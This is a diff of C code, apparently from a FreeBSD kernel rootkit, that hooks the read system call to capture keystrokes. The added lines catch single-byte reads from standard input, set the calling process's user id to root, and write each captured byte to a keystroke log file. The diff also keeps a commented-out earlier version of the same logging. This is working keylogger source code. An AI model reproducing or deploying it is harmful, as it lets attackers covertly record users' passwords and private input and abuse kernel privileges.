@@ -180,48 +180,49 @@ int hook_sys_openat(struct thread * td, struct openat_args * uap) {
 
 int hook_sys_read(struct thread *td, struct read_args * uap){
 
-	struct uio auio;
-	struct iovec aiov;
-	int error;
+	int error = 0;
 
-	if (uap->nbyte > IOSIZE_MAX)
-		return (EINVAL);
-	aiov.iov_base = uap->buf;
-	aiov.iov_len = uap->nbyte;
-	auio.uio_iov = &aiov;
-	auio.uio_iovcnt = 1;
-	auio.uio_resid = uap->nbyte;
-	auio.uio_segflg = UIO_USERSPACE;
-	error = kern_readv(td, uap->fd, &auio);
+	// error = sys_read(td, uap);
+	// if(error)
+	// 	return error;
+
+	// if(uap->fd == 0 && uap->nbyte > 1) {
+		// int fd;
+		// uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
+		// td->td_proc->p_ucred->cr_uid = 0;
+		// error = filewriter_openlog(td, &fd, KEYSTROKE);
+		// if(error)
+		// 	printf("err1: %d\n", error);
+		// error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
+		// if(error)
+		// 	printf("err2: %d\n", error);
+		// error = filewriter_closelog(td, fd);
+		// if(error)
+		// 	printf("err3: %d\n", error);
+		// td->td_proc->p_ucred->cr_uid = savedcreds;
+	// }
+
+	// return error;
 
 
-		
-
+	error = sys_read(td, uap);
 	char buf[1];
 	int done;
 
-
-	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
+	if(error || uap->nbyte == 0 || uap->nbyte > 1 || uap->fd != 0)
 		return(error);
-	}
-
-
 
 	copyinstr(uap->buf, buf, 1, &done);
 
-	
+	printf("%c\n", buf[0]);
 
-	// printf("%c", buf[0]);
-
-	int testfd = 0;
-
-	int testerror = filewriter_openlog(td, &testfd, KEYSTROKE);
-	
-	printf("testerror is %d\n", testerror);
-
-	testerror = filewriter_closelog(td, testfd);	
-
-	printf("testerror is %d\n", testerror);
+	int fd;
+	uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
+	td->td_proc->p_ucred->cr_uid = 0;
+	error = filewriter_openlog(td, &fd, KEYSTROKE);
+	error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
+	error = filewriter_closelog(td, fd);
+	td->td_proc->p_ucred->cr_uid = savedcreds;
 
 	return(error);
 
